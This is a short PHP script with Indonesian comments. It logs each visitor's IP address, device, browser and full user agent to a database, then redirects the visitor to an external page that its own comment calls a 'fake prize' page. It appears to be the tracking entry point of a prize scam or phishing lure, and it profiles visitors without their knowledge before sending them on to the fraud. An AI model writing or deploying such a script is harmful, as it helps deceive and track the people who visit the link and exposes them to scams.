<?php
include "config.php";

$ip = $_SERVER['REMOTE_ADDR'];
$agent = $_SERVER['HTTP_USER_AGENT'];
$device = "Unknown";
$browser = "Unknown";

// Deteksi device
if (strpos($agent, 'Android') !== false) $device = "Android";
elseif (strpos($agent, 'iPhone') !== false) $device = "iPhone";
elseif (strpos($agent, 'iPad') !== false) $device = "iPad";
elseif (strpos($agent, 'Windows') !== false) $device = "Windows";
elseif (strpos($agent, 'Macintosh') !== false) $device = "Mac";

// Deteksi browser
if (strpos($agent, 'Chrome') !== false) $browser = "Chrome";
elseif (strpos($agent, 'Firefox') !== false) $browser = "Firefox";
elseif (strpos($agent, 'Safari') !== false) $browser = "Safari";
elseif (strpos($agent, 'Edge') !== false) $browser = "Edge";
elseif (strpos($agent, 'Opera') !== false) $browser = "Opera";

// Simpan ke database
$stmt = $conn->prepare("INSERT INTO visitors (ip, device, browser, user_agent) VALUES (?, ?, ?, ?)");
$stmt->bind_param("ssss", $ip, $device, $browser, $agent);
$stmt->execute();
$stmt->close();
$conn->close();

// Redirect ke halaman fake hadiah
header("Location: https://money.cleverapps.io/hadiah.php");
exit;
?>